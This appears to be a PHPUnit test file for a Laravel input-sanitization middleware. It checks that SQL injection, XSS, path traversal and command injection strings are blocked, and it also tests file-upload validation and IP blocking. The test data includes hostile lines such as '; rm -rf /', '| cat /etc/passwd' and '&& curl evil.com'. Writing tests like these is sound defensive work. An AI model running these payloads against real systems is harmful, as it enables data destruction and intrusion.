<?php

namespace Tests\Unit\Middleware;

use App\Http\Middleware\InputSanitizationMiddleware;
use App\Models\AuditLog;
use Illuminate\Http\Request;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Cache;
use Symfony\Component\HttpFoundation\Response;
use Tests\TestCase;

class InputSanitizationMiddlewareTest extends TestCase
{
    private InputSanitizationMiddleware $middleware;
    private Request $request;

    protected function setUp(): void
    {
        parent::setUp();
        $this->middleware = new InputSanitizationMiddleware();
        $this->request = Request::create('/test', 'POST');
    }

    /** @test */
    public function it_passes_clean_requests_through()
    {
        $this->request->merge([
            'name' => 'John Doe',
            'email' => 'john@example.com',
            'description' => 'This is a clean description.'
        ]);

        $response = $this->middleware->handle($this->request, function ($req) {
            return response('Success');
        });

        $this->assertEquals('Success', $response->getContent());
        $this->assertEquals(200, $response->getStatusCode());
    }

    /** @test */
    public function it_detects_sql_injection_patterns()
    {
        $maliciousInputs = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "UNION SELECT * FROM passwords",
            "admin'/*",
            "1; DELETE FROM users",
            "' OR 'x'='x",
        ];

        foreach ($maliciousInputs as $input) {
            $request = Request::create('/test', 'POST', ['input' => $input]);
            
            $response = $this->middleware->handle($request, function ($req) {
                return response('Success');
            });

            $this->assertEquals(400, $response->getStatusCode(), "Failed to detect SQL injection: {$input}");
        }
    }

    /** @test */
    public function it_detects_xss_patterns()
    {
        $maliciousInputs = [
            '<script>alert("XSS")</script>',
            '<iframe src="javascript:alert(1)"></iframe>',
            'javascript:alert(1)',
            '<img src="x" onerror="alert(1)">',
            '<object data="javascript:alert(1)">',
            'vbscript:msgbox("XSS")',
            '<embed src="javascript:alert(1)">',
        ];

        foreach ($maliciousInputs as $input) {
            $request = Request::create('/test', 'POST', ['input' => $input]);
            
            $response = $this->middleware->handle($request, function ($req) {
                return response('Success');
            });

            $this->assertEquals(400, $response->getStatusCode(), "Failed to detect XSS: {$input}");
        }
    }

    /** @test */
    public function it_detects_path_traversal_attacks()
    {
        $maliciousInputs = [
            '../../../etc/passwd',
            '..\\..\\windows\\system32',
            '/etc/passwd',
            '\\windows\\system32\\config',
        ];

        foreach ($maliciousInputs as $input) {
            $request = Request::create('/test', 'POST', ['path' => $input]);
            
            $response = $this->middleware->handle($request, function ($req) {
                return response('Success');
            });

            $this->assertEquals(400, $response->getStatusCode(), "Failed to detect path traversal: {$input}");
        }
    }

    /** @test */
    public function it_detects_command_injection_patterns()
    {
        $maliciousInputs = [
            '; ls -la',
            '| cat /etc/passwd',
            '`whoami`',
            '$(id)',
            '; rm -rf /',
            '&& curl evil.com',
        ];

        foreach ($maliciousInputs as $input) {
            $request = Request::create('/test', 'POST', ['command' => $input]);
            
            $response = $this->middleware->handle($request, function ($req) {
                return response('Success');
            });

            $this->assertEquals(400, $response->getStatusCode(), "Failed to detect command injection: {$input}");
        }
    }

    /** @test */
    public function it_sanitizes_input_data()
    {
        $this->request->merge([
            'name' => '  John<script>alert(1)</script>Doe  ',
            'email' => 'john@example.com<iframe>',
            'description' => 'This has <b>HTML</b> tags and special chars: <>&"\'',
        ]);

        $next = function ($request) {
            $this->assertEquals('John Doe', trim($request->get('name')));
            $this->assertStringNotContainsString('<script>', $request->get('name'));
            $this->assertStringNotContainsString('<iframe>', $request->get('email'));
            $this->assertStringNotContainsString('<b>', $request->get('description'));
            return response('Success');
        };

        $response = $this->middleware->handle($this->request, $next);
        $this->assertEquals(200, $response->getStatusCode());
    }

    /** @test */
    public function it_sanitizes_nested_array_data()
    {
        $this->request->merge([
            'user' => [
                'name' => '<script>alert(1)</script>John',
                'profile' => [
                    'bio' => 'This has <b>nested</b> HTML',
                    'tags' => ['<script>', 'normal-tag', '<iframe>']
                ]
            ]
        ]);

        $next = function ($request) {
            $user = $request->get('user');
            $this->assertStringNotContainsString('<script>', $user['name']);
            $this->assertStringNotContainsString('<b>', $user['profile']['bio']);
            $this->assertStringNotContainsString('<script>', $user['profile']['tags'][0]);
            return response('Success');
        };

        $response = $this->middleware->handle($this->request, $next);
        $this->assertEquals(200, $response->getStatusCode());
    }

    /** @test */
    public function it_validates_file_uploads()
    {
        // Create a fake file with allowed MIME type
        $validFile = UploadedFile::fake()->image('test.jpg');
        
        $this->request->files->set('upload', $validFile);

        $response = $this->middleware->handle($this->request, function ($req) {
            return response('Success');
        });

        $this->assertEquals(200, $response->getStatusCode());
    }

    /** @test */
    public function it_blocks_executable_file_uploads()
    {
        $blockedExtensions = ['php', 'exe', 'com', 'bat', 'sh', 'js', 'vbs'];

        foreach ($blockedExtensions as $extension) {
            $maliciousFile = UploadedFile::fake()->create("malicious.{$extension}", 100);
            $request = Request::create('/test', 'POST');
            $request->files->set('upload', $maliciousFile);

            $response = $this->middleware->handle($request, function ($req) {
                return response('Success');
            });

            $this->assertEquals(422, $response->getStatusCode(), "Failed to block .{$extension} file");
        }
    }

    /** @test */
    public function it_blocks_files_exceeding_size_limit()
    {
        // Create a file larger than the default 10MB limit
        $largeFile = UploadedFile::fake()->create('large.txt', 11 * 1024); // 11MB
        
        $this->request->files->set('upload', $largeFile);

        $response = $this->middleware->handle($this->request, function ($req) {
            return response('Success');
        });

        $this->assertEquals(422, $response->getStatusCode());
    }

    /** @test */
    public function it_detects_php_code_in_uploaded_files()
    {
        $fileContent = '<?php echo "malicious code"; ?>';
        $tempFile = tmpfile();
        fwrite($tempFile, $fileContent);
        $tempPath = stream_get_meta_data($tempFile)['uri'];

        $maliciousFile = new UploadedFile(
            $tempPath,
            'innocent.txt',
            'text/plain',
            null,
            true
        );

        $this->request->files->set('upload', $maliciousFile);

        $response = $this->middleware->handle($this->request, function ($req) {
            return response('Success');
        });

        $this->assertEquals(422, $response->getStatusCode());
        fclose($tempFile);
    }

    /** @test */
    public function it_validates_image_files_properly()
    {
        // Create a valid image file
        $validImage = UploadedFile::fake()->image('test.png', 100, 100);
        
        $this->request->files->set('upload', $validImage);

        $response = $this->middleware->handle($this->request, function ($req) {
            return response('Success');
        });

        $this->assertEquals(200, $response->getStatusCode());
    }

    /** @test */
    public function it_blocks_files_with_invalid_mime_types()
    {
        $invalidFile = UploadedFile::fake()->create('test.unknown', 100, 'application/unknown');
        
        $this->request->files->set('upload', $invalidFile);

        $response = $this->middleware->handle($this->request, function ($req) {
            return response('Success');
        });

        $this->assertEquals(422, $response->getStatusCode());
    }

    /** @test */
    public function it_logs_security_violations()
    {
        $maliciousInput = "'; DROP TABLE users; --";
        $request = Request::create('/test', 'POST', ['input' => $maliciousInput]);

        $this->middleware->handle($request, function ($req) {
            return response('Success');
        });

        // Check that audit log was created
        $this->assertDatabaseHas('audit_logs', [
            'event_type' => 'security',
            'description' => 'Dangerous Pattern Detected',
        ]);
    }

    /** @test */
    public function it_blocks_ip_after_multiple_violations()
    {
        $maliciousInput = "'; DROP TABLE users; --";
        $ip = '192.168.1.100';

        // Simulate 3 attempts from the same IP
        for ($i = 0; $i < 3; $i++) {
            $request = Request::create('/test', 'POST', ['input' => $maliciousInput]);
            $request->server->set('REMOTE_ADDR', $ip);

            $this->middleware->handle($request, function ($req) {
                return response('Success');
            });
        }

        // Check that IP is now blocked
        $this->assertTrue(Cache::has('ip_blocked_' . $ip));
    }

    /** @test */
    public function it_skips_validation_for_excluded_routes()
    {
        config(['security.input_sanitization.skip_routes' => ['/api/webhook']]);

        $request = Request::create('/api/webhook', 'POST', [
            'data' => "'; DROP TABLE users; --" // Normally malicious
        ]);

        $response = $this->middleware->handle($request, function ($req) {
            return response('Success');
        });

        $this->assertEquals(200, $response->getStatusCode());
    }

    /** @test */
    public function it_skips_validation_for_api_routes_when_configured()
    {
        config(['security.input_sanitization.skip_api' => true]);

        $request = Request::create('/api/test', 'POST', [
            'data' => '<script>alert(1)</script>' // Normally malicious
        ]);

        $response = $this->middleware->handle($request, function ($req) {
            return response('Success');
        });

        $this->assertEquals(200, $response->getStatusCode());
    }

    /** @test */
    public function it_removes_null_bytes_from_input()
    {
        $this->request->merge([
            'name' => "John\x00Doe",
            'description' => "This has null\x00bytes",
        ]);

        $next = function ($request) {
            $this->assertStringNotContainsString("\x00", $request->get('name'));
            $this->assertStringNotContainsString("\x00", $request->get('description'));
            return response('Success');
        };

        $response = $this->middleware->handle($this->request, $next);
        $this->assertEquals(200, $response->getStatusCode());
    }

    /** @test */
    public function it_removes_control_characters_from_input()
    {
        $this->request->merge([
            'name' => "John\x01\x02Doe",
            'description' => "This has\x1fcontrol\x7fchars",
        ]);

        $next = function ($request) {
            $name = $request->get('name');
            $description = $request->get('description');
            
            // Should not contain control characters
            $this->assertStringNotContainsString("\x01", $name);
            $this->assertStringNotContainsString("\x02", $name);
            $this->assertStringNotContainsString("\x1f", $description);
            $this->assertStringNotContainsString("\x7f", $description);
            
            return response('Success');
        };

        $response = $this->middleware->handle($this->request, $next);
        $this->assertEquals(200, $response->getStatusCode());
    }

    /** @test */
    public function it_handles_empty_and_null_values()
    {
        $this->request->merge([
            'name' => '',
            'description' => null,
            'tags' => [],
            'count' => 0,
        ]);

        $next = function ($request) {
            $this->assertEquals('', $request->get('name'));
            $this->assertNull($request->get('description'));
            $this->assertEquals([], $request->get('tags'));
            $this->assertEquals(0, $request->get('count'));
            return response('Success');
        };

        $response = $this->middleware->handle($this->request, $next);
        $this->assertEquals(200, $response->getStatusCode());
    }
}